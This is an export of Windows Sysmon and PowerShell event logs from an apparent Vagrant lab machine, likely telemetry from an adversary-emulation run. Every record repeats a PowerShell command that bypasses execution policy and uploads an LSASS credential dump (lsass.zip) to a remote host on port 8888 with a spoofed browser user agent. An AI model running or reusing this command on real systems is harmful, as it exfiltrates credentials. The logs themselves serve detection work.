ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ""
ParentUser: VAGRANT\vagrant",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"C:\Program Files\Git\cmd\git.exe, help, -a",3,"""C:\Program Files\Git\cmd\git.exe"" help -a",{7a53022b-4569-6352-c601-000000000b00},C:\Program Files\Git\cmd\git.exe,602f5931006b9aa2bdd04d43cfc3ec39,621e3677d88c56bd0797a48d6beae682b8255027,6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2,git.exe,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",5,"powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); """,{7a53022b-4566-6352-c301-000000000b00},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,"7,036",The Git Development Community,Git for Windows,-,b5c28ab8b10670f75eb53affc23558e6,git.exe,Git,"5,700",-,-,C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\,-,-,-,-,-,-,"6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2, 621e3677d88c56bd0797a48d6beae682b8255027, 602f5931006b9aa2bdd04d43cfc3ec39, b5c28ab8b10670f75eb53affc23558e6",vagrant,"technique_id=T1059.001,technique_name=PowerShell",-,-,-,VAGRANT,S-1-5-18,vagrant,-,wineventlog,Microsoft-Windows-Sysmon/Operational,vagrant,-,The Git Development Community,-,Git for Windows,-,-,-,High,{7a53022b-2aa0-6352-661a-050000000000},0x51a66,VAGRANT\vagrant,Git,-,-,-,-,-,-,-,-,1,1,-,Info,"2,716","3,916",{5770385f-c22a-43e0-bf4c-06f5698ffbd9},Microsoft-Windows-Sysmon,6528,Process Create (rule: ProcessCreate),NT AUTHORITY,S-1-5-18,SYSTEM,User,5
"Oct 21, 2022 @ 03:08:23.950",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.sysmon_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Process Create (rule: ProcessCreate),verified,process,1,"Oct 21, 2022 @ 03:08:25.601",windows.sysmon_operational,"Oct 21, 2022 @ 03:08:49.000",event,windows,Microsoft-Windows-Sysmon,-,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2022-10-21 07:08:23.950
ProcessGuid: {7a53022b-4567-6352-c401-000000000b00}
ProcessId: 6464
Image: C:\Program Files\Git\cmd\git.exe
FileVersion: -
Description: Git for Windows
Product: Git
Company: The Git Development Community
OriginalFileName: git.exe
CommandLine: ""C:\Program Files\Git\cmd\git.exe"" --version
CurrentDirectory: C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\
User: VAGRANT\vagrant
LogonGuid: {7a53022b-2aa0-6352-661a-050000000000}
LogonId: 0x51A66
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=621E3677D88C56BD0797A48D6BEAE682B8255027,MD5=602F5931006B9AA2BDD04D43CFC3EC39,SHA256=6C4DBB77D05CA5C482CE3782255F56BB904445809F1DF3B655E2505EAC7FA0B2,IMPHASH=B5C28AB8B10670F75EB53AFFC23558E6
ParentProcessGuid: {7a53022b-4566-6352-c301-000000000b00}
ParentProcessId: 7036
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ""
ParentUser: VAGRANT\vagrant",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"C:\Program Files\Git\cmd\git.exe, --version",2,"""C:\Program Files\Git\cmd\git.exe"" --version",{7a53022b-4567-6352-c401-000000000b00},C:\Program Files\Git\cmd\git.exe,602f5931006b9aa2bdd04d43cfc3ec39,621e3677d88c56bd0797a48d6beae682b8255027,6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2,git.exe,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",5,"powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); """,{7a53022b-4566-6352-c301-000000000b00},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,"7,036",The Git Development Community,Git for Windows,-,b5c28ab8b10670f75eb53affc23558e6,git.exe,Git,"6,464",-,-,C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\,-,-,-,-,-,-,"6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2, 621e3677d88c56bd0797a48d6beae682b8255027, 602f5931006b9aa2bdd04d43cfc3ec39, b5c28ab8b10670f75eb53affc23558e6",vagrant,"technique_id=T1059.001,technique_name=PowerShell",-,-,-,VAGRANT,S-1-5-18,vagrant,-,wineventlog,Microsoft-Windows-Sysmon/Operational,vagrant,-,The Git Development Community,-,Git for Windows,-,-,-,High,{7a53022b-2aa0-6352-661a-050000000000},0x51a66,VAGRANT\vagrant,Git,-,-,-,-,-,-,-,-,1,1,-,Info,"2,716","3,916",{5770385f-c22a-43e0-bf4c-06f5698ffbd9},Microsoft-Windows-Sysmon,6526,Process Create (rule: ProcessCreate),NT AUTHORITY,S-1-5-18,SYSTEM,User,5
"Oct 21, 2022 @ 03:08:23.665",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Engine Lifecycle,verified,process,400,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,13,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=5.1.17763.1852
	RunspaceId=bde48661-68d6-4497-8031-ceecb4afd9c6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,Available,None,5.1.17763.1852,-,-,-,-,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,Info,-,-,-,PowerShell,1550,Engine Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,1,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Registry,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1544,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,3,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Alias,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1545,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,5,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
